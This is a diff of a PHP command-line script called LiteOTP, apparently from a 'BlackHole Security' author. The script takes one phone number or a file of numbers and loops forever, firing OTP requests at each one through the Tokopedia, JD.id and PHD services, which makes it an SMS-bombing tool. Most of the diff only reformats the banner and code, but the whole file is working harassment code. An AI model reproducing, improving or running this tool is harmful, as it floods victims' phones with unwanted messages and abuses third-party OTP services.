@@ -1,71 +1,87 @@
 <?php
 
-require __DIR__.'/vendor/autoload.php';
+require __DIR__ . '/vendor/autoload.php';
 use Cvar1984\LiteOtp\Otp;
 
 if (strtolower(substr(PHP_OS, 0, 3)) == 'win') {
-    $R  = '';
+    $R = '';
     $RR = '';
-    $G  = '';
+    $G = '';
     $GG = '';
-    $B  = '';
+    $B = '';
     $BB = '';
-    $Y  = '';
+    $Y = '';
     $YY = '';
-    $X  = '';
+    $X = '';
 } else {
-    $R  = "\e[91m";
+    $R = "\e[91m";
     $RR = "\e[91;7m";
-    $G  = "\e[92m";
+    $G = "\e[92m";
     $GG = "\e[92;7m";
-    $B  = "\e[36m";
+    $B = "\e[36m";
     $BB = "\e[36;7m";
-    $Y  = "\e[93m";
+    $Y = "\e[93m";
     $YY = "\e[93;7m";
-    $X  = "\e[0m";
+    $X = "\e[0m";
 }
 
-echo $Y
-    . '
- _     _ _        ___ _____ ____
+echo <<<BANNER
+$Y _     _ _        ___ _____ ____
 | |   (_) |_ ___ / _ \_   _|  _ \
 | |   | | __/ _ \ | | || | | |_) |
 | |___| | ||  __/ |_| || | |  __/
-|_____|_|\__\___|\___/ |_| |_|';
-echo $R . "\n" . '++++++++++++++++++++++++++++++++++++++';
-echo $B . "\n" . 'Author  : Cvar1984                   ' . $R . '+';
-echo $B . "\n" . 'Github  : https://github.com/Cvar1984' . $R . '+';
-echo $B . "\n" . 'Team    : BlackHole Security         ' . $R . '+';
-echo $B . "\n" . 'Version : 2.6                        ' . $R . '+';
-echo $B . "\n" . 'Date    : 13-03-2018                 ' . $R . '+';
-echo $R . "\n" . '++++++++++++++++++++++++++++++++++++++' . $G . $X . "\n";
+|_____|_|\__\___|\___/ |_| |_|
+
+$R++++++++++++++++++++++++++++++++++++++
+$B Author  : Cvar1984                   $R
+$B Github  : https://github.com/Cvar1984$R
+$B Team    : BlackHole Security         $R
+$B Version : 2.0.7                      $R
+$B Date    : 13-03-2018                 $R
+$R++++++++++++++++++++++++++++++++++++++$G$X
+
+
+BANNER;
+
 try {
     if ($argc < 2) {
         throw new Exception('Input No List');
     }
-    $bom = new Otp();
+
     if (is_numeric($argv[1])) {
-        $bom->sendOtp((int)$argv[1], 'tokopedia');
+        $no = $argv[1];
+        printf('%sSend OTP to %s[%s]%s%s', $G, $Y, $no, $X, PHP_EOL);
+        Otp::tokopedia($no);
+
         while (1) {
-            fprintf(STDOUT, '%sSend OTP to %s[%s]%s%s', $G, $Y, $argv[1], $X, PHP_EOL);
-            $bom->sendOtp((int)$argv[1], 'jdid');
-            $bom->sendOtp((int)$argv[1], 'phd');
+            printf('%sSend OTP to %s[%s]%s%s', $G, $Y, $no, $X, PHP_EOL);
+            Otp::jdid($no);
+            Otp::phd($no);
         }
-    } else if (file_exists($argv[1])) {
-        $argv[1] = file_get_contents($argv[1]);
-        $argv[1] = trim($argv[1], " \t\n\r\0\x0B"); //remove whitespace
-        $argv[1] = explode("\n", $argv[1]);
-        $count = sizeof($argv[1]);
+    } elseif (is_file($argv[1])) {
+        $no = $argv[1];
+        $no = file_get_contents($no);
+        $no = trim($no, " \t\n\r\0\x0B"); //remove whitespace
+        $no = explode(PHP_EOL, $no);
+        $count = sizeof($no);
+
         while (1) {
             for ($x = 0; $x < $count; $x++) {
-                fprintf(STDOUT, '%sSend OTP to %s[%s]%s%s', $G, $Y, $argv[1][$x], $X, PHP_EOL);
-                $bom->sendOtp((int)$argv[1][$x], 'tokopedia');
-                $bom->sendOtp((int)$argv[1][$x], 'jdid');
-                $bom->sendOtp((int)$argv[1][$x], 'phd');
+                printf(
+                    '%sSend OTP to %s[%s]%s%s',
+                    $G,
+                    $Y,
+                    $no[$x],
+                    $X,
+                    PHP_EOL
+                );
+                Otp::tokopedia($no[$x]);
+                Otp::jdid($no[$x]);
+                Otp::phd($no[$x]);
             }
         }
     } else {
-        throw new Exception('File not exist ' . $argv[1]);
+        throw new Exception($argv[1] . ' Is not a file');
     }
 } catch (Exception $e) {
     fprintf(STDERR, "%s%s%s\n", $RR, $e->getMessage(), $X);
